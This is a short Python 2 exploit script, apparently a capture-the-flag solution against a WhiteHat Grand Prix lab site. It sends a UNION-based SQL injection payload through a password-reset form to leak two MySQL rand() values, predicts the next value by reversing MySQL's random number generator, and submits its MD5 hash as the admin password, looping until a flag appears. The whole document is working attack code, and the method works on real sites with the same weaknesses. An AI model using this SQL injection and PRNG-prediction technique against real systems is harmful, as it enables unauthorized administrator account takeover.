import md5
import requests
from decimal import Decimal

URL = "http://lab14b.grandprix.whitehatvn.com/index.php"


# https://github.com/twitter/mysql/blob/master/sql/password.c
# We can calculate the next random value from two previous values
def my_rnd(s1, s2):
    mv = 0x3FFFFFFFL
    s1 = (s1 * 3 + s2) % mv
    s2 = (s1 + s2 + 33) % mv
    rs = s1 / mv
    return rs


def next_rnd(rs1, rs2):
    mv = 0x3FFFFFFFL
    s1 = rs2 * mv
    s1p = rs1 * mv
    s2p = s1 - (s1p * 3) % mv
    s2 = (s1 + s2p + 33) % mv
    return my_rnd(s1, s2)


def md5_hash(msg):
    return md5.new(str(msg).strip()).hexdigest()


def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""


# Get two random numbers using sql injection vulnerability
def get_bootstrap():
    payload = {'user': "' union select concat(rand(), '|', rand())-- -", 'sub1': 'Forgot+password+%3F+Reset'}
    r = requests.post(URL, data=payload)
    bootstrap = find_between(r.text, "id ", "...").strip().split("|")
    rand1 = Decimal(bootstrap[0])
    rand2 = Decimal(bootstrap[1])
    return rand1, rand2


def get_root():
    r1, r2 = get_bootstrap()

    # Calculate the next random value
    r3 = next_rnd(float(r1), float(r2))
    r3 = format(r3, '.16f')

    # hash and send request to server
    password = md5_hash(r3)
    payload = {'user': 'admin', 'sub2': 'sa', 'password': password}
    r = requests.post(URL, data=payload)
    return r.text


result = ""
while "flag" not in result:
    result = get_root()
print result
